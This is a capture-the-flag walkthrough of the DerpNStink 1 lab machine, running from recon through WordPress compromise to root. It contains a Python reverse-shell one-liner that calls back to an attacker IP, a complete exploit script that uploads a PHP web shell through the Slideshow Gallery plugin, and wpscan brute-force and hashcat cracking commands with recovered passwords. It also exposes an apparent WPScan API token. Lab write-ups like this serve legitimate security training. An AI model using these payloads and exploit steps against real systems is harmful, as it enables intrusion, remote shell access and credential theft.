# DerpNStink 1

# 1 Information gathering
## 1.1 Discovery host
`nmap -n -Pn -F 192.168.196.1/24 -oN host_discovery.txt`
![022c8c22cd180ff714705b4ae8fc5d9f.png](./_resources/754241650947462b8c21260abfba502b.png)


## 1.2 Service enum
`nmap -sV -sC -p- 192.168.196.133 -oN full_service_enum-sC.txt`
![bdab0efd6dc7459a88039ce65cc1e170.png](./_resources/d8175bbf22af4436b6b4fb4f0df19452.png)

`nmap -sV -sU -F 192.168.196.133 -oN udp-sC-sV.txt`
![4cd6921632b52f41cb114372b3b59dea.png](./_resources/e0ea04e50d53401f9c54e0a281dc7d62.png)

## 1.3 Web
## 1.3.1 Gobuster
`gobuster dir -u http://192.168.196.133 -w /usr/share/wordlists/dirb/big.txt -t 50 -f -o info-slash.txt`
![674c87d8bae66bb876dc00ca20a65b86.png](./_resources/f922f74f463f4389a09d01c0f3fae9c8.png)

`gobuster dir -u http://192.168.196.133 -w /usr/share/wordlists/dirb/big.txt -t 50 -o info.tx`
![917ee46eb4b3cec9c0221c89ba776983.png](./_resources/070f6db8d0ef4e09ba31a91ea49a246a.png)

## 1.3.2 Wordpress
![94549bd1c2b883643400371fd227dc69.png](./_resources/5b7fe812262d41209bcfe31eb3ad1626.png)

### 1.3.2.1 Wpscan
`wpscan --url http://derpnstink.local/weblog/ -e ap,at,tt,cb,dbe,u1-20,m --plugins-detection aggressive --disable-tls-checks --api-token 7MBL9noH6s6pOW5qAM6boXVS5wEMayvrBaaoBbMaIKg -o all-info.txt --ignore-main-redirectt`
![0b7722db9c17f1f4e0ae67eb9dc287c1.png](./_resources/2b5862fe19c94599b4873571c40d3583.png)
![648b7258e4620f69ae90b8fef940f0d5.png](./_resources/a6f878970100450487a2c2f207cc2f03.png)
![9d6d44268d5ad580985802073d01b370.png](./_resources/4296200b4067411c9a2213603baae34f.png)
![e9ab25621e52d2ad0626246496458620.png](./_resources/1a27f22b75354542a040b0060e84da37.png)


# 2 Exploitation using previously found exploits (Slideshow Gallery < 1.4.7 - Arbitrary File Upload)
## 2.1 Wordpress brute force login - wpscan
`wpscan --url http://derpnstink.local/weblog/ -P /root/shared/rockyou.txt -U admin -t 50`
![8635dbf1cc7acc12678fceae7c575183.png](./_resources/24db8ac9040144819495954b937c53b9.png)

## 2.2 Shell reverse with public exploit
https://www.exploit-db.com/exploits/34681/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

`python2.7 34681.py -t http://derpnstink.local/weblog/ -u admin -p admin -f shell.php`
![22cb00c08d1c0d9ad16bd5bf467c414a.png](./_resources/02db80b645824cfe87147a22306371b3.png)

`python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.196.121",4446));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
![236ced6bced5a513177f972226116d57.png](./_resources/13dc6a084b7d4978a38fcca0bba5c75e.png)
![a45f59d518c25fd9d8543ea4ebbd653f.png](./_resources/4ad45c45e6c74b7e997d911b176751b5.png)

## 2.2 Web shell with coded exploit
http://whitexploit.blogspot.com/ <- explanation about the vuln
```
#!/usr/bin/env python3
#! Exploit by byth22 - Kellvin Romano
import requests
import os

def login(username,password):
    cookies = {
        'wordpress_test_cookie': 'WP+Cookie+check',
    }

    headers = {
        'Host': 'derpnstink.local',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '114',
        'Origin': 'http://derpnstink.local',
        'Connection': 'close',
        'Referer': 'http://derpnstink.local/weblog/wp-login.php?loggedout=true',
        'Upgrade-Insecure-Requests': '1',
    }

    data = 'log='+username+'&pwd='+password+'&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1'

    global s
    s = requests.Session()
    return s.post('http://derpnstink.local/weblog/wp-login.php', headers=headers, cookies=cookies, data=data, verify=False)


def upload_shell(shell,shell_name):
    global s
    headers = {
        'Host': 'derpnstink.local',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'multipart/form-data; boundary=---------------------------323205443534659833621751587321',
        'Content-Length': '1999',
        'Origin': 'http://derpnstink.local',
        'Connection': 'close',
        'Referer': 'http://derpnstink.local/weblog/wp-admin/admin.php?page=slideshow-slides&method=save',
        'Upgrade-Insecure-Requests': '1',
    }

    params = (
        ('page', 'slideshow-slides'),
        ('method', 'save'),
    )

    data = '-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[id]"\r\n\r\n\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[order]"\r\n\r\n\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[title]"\r\n\r\nteste\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[description]"\r\n\r\nteste\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[showinfo]"\r\n\r\nnone\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[iopacity]"\r\n\r\n70\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[type]"\r\n\r\nfile\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="image_file"; filename="'+shell_name+'"\r\nContent-Type: application/x-php\r\n\r\n'+shell+'\n\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[image_url]"\r\n\r\n\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[uselink]"\r\n\r\nN\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[link]"\r\n\r\n\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="Slide[linktarget]"\r\n\r\nself\r\n-----------------------------323205443534659833621751587321\r\nContent-Disposition: form-data; name="submit"\r\n\r\nSave Slide\r\n-----------------------------323205443534659833621751587321--\r\n'

    response = s.post('http://derpnstink.local/weblog/wp-admin/admin.php', headers=headers, params=params,  data=data, verify=False)
    print ("[!] Shell upload successfully!")
    print ("[!] The path is /wp-content/uploads/slideshow-gallery/ + shell name!")
    return True

def read_shell(shell):
    with open(shell) as f:
        lines = f.read()

    return lines

def main():
    cookie = login('admin','admin') # <- set you user and pass here
    shell = read_shell('./shell3.php') # <- set file to upload
    upload_shell(shell, 'shell3.php') # <- set file and u name


main()

```


# 3 Post-exploitation
Content of wp-config.php:

![fb8068471ca1d4b5d7be2285bcce71e3.png](./_resources/6b13009946ad4e3fb8bbd98c3173cfde.png)

## 3.1 Hashs on mysql table
`mysql -u root -p`

![5c6436c8362f471139a0e9a9044710d0.png](./_resources/8926f12a56e54467910ac059f92731fc.png)

![1f029aa772302702cbb0d4a6207a0517.png](./_resources/8e53677e6c204be2b09a4268e8da497f.png)

![6ec5cfc6d6e885f355217954d0d94308.png](./_resources/c4f684a3f19243cab4cb741ea7c9119a.png)

### 3.1.1 Hashcat cracking md5
https://blog.wpsec.com/cracking-wordpress-passwords-with-hashcat/

`Hash-identifier` was identified that that hahes are md5 wordpress.

`hashcat -m 400 -a 1 hash.txt /root/shared/rockyou.txt`

wedgie57 <- password


## 3.2 Login as Stinky
Based on home users, tried to login to ssh.

![6b61e6a73bce58b7d6ea12e500c638e1.png](./_resources/d85640abd8394441a6d85ddfcfea4e91.png)

Without permission.

## 3.3 Ftp login as Stinky
![a2e4a80ff4eca06f9c9125b4ec7b888a.png](./_resources/eed8ef3d023e4be588cc90ac3336a849.png)

`cat derpissues.txt key.txt test.txt| less -r`

![eef4c494629eb931a211c3d7ab5e974c.png](./_resources/79abac3db6064161ad49d8c5199f662e.png)

## 3.4 SSH login as Stinky
![c60fdacd5d898c5db3d435a6db6ce39d.png](./_resources/ab49793d8a3b4d0c8d5bc1d8d73c8c32.png)

It needs specific permissions.

`chmod  0200 key.txt`
![d627d1abe29e189592a562c12091109f.png](./_resources/89162eee4abe4f6dbbd3d96548bc1ca9.png)

### 3.4.1 Enum and analysing pcap file
![d467efc632458fb9bbf2c63483cf31fe.png](./_resources/9dcbb7f2da004137b15acce4fd235342.png)
![3327b0fddf734953188bdb3c46451adf.png](./_resources/46932982188440f293792838de26731b.png)

Analysing this post requests on file user-new.php, we found a user and password following the tcp stream:
![adc08ea780c2c1a08495fb63a01ce16b.png](./_resources/d96bb76f4334445986729e2f2c6888b4.png)
![771b540791ce600f981a3e0ca38ff2e8.png](./_resources/a04372e88cf04aedb94f30a46da07503.png)	

### 3.5 Login with su as mrderp
mrderp:derpderpderpderpderpderpderp

![0518210d69c6325024742cac99c1c5cb.png](./_resources/1ee38c1f042749849f6d993db11b0c85.png)

## 3.6 Login as root - sudo abusing
![7fd1f9d5bce9b1abb9d35ab2f67e3717.png](./_resources/7bf1271044dd479d8768b8444b45e3f8.png)

This folder (binaries) doesn't exist, but we can creat and abuse it.

![68d4c2791fe60019112d1d09aa26aba7.png](./_resources/f0208a409ff6421c8d8cf60b25f3e266.png)
Is rooted!
